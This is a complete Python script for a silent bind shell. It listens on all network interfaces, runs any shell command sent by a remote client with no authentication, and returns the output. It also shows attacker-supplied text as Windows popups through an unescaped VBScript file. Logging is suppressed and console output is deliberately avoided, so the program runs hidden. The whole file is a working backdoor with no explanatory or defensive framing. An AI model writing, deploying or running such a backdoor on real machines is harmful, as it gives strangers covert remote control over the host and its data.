import socket
import subprocess
import threading
import os
import logging

# Configure logging to suppress output
logging.basicConfig(level=logging.CRITICAL)

# Server configuration
HOST = '0.0.0.0'  # Listen on all available interfaces
PORT = 65432  # Port to listen on

def execute_command(command, conn):
    try:
        # Start the command asynchronously
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate()  # Get command output and errors
        if stdout:
            conn.sendall(stdout.encode('utf-8'))
        if stderr:
            conn.sendall(stderr.encode('utf-8'))
        if not (stdout or stderr):
            conn.sendall(b'Command executed with no output.')
    except Exception as e:
        conn.sendall(f"Error: {str(e)}".encode('utf-8'))

def show_vbs_popup(message):
    # Create a VBScript file to display a message box
    vbs_code = f'Set obj = CreateObject("WScript.Shell")\nobj.Popup "{message}", 5, "Message", 64'
    vbs_file = 'popup.vbs'
    with open(vbs_file, 'w') as file:
        file.write(vbs_code)
    # Execute the VBScript
    os.system(f'cscript //nologo {vbs_file}')
    # Optionally, remove the VBScript file after execution
    os.remove(vbs_file)

def handle_client(conn):
    with conn:
        while True:
            data = conn.recv(1024).decode('utf-8')
            if not data:
                break
            if data.lower() == 'exit':
                conn.sendall(b'Connection closed.')
                break
            if data.lower().startswith('command '):
                # Execute command if it starts with 'command'
                command = data[8:].strip()  # Remove 'command ' prefix
                threading.Thread(target=execute_command, args=(command, conn)).start()
            elif data.lower().startswith('chat '):
                # Show VBScript popup for non-command text
                message = data[5:].strip()  # Remove 'chat ' prefix
                show_vbs_popup(message)
                conn.sendall(b'Popup displayed for non-command text.')
            else:
                conn.sendall(b'Invalid input. Prefix with "command " or "chat ".')
                
def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen(5)
        # Do not print anything to the console
        while True:
            conn, addr = s.accept()  # Automatically captures client's IP address
            handle_client(conn)

if __name__ == "__main__":
    main()
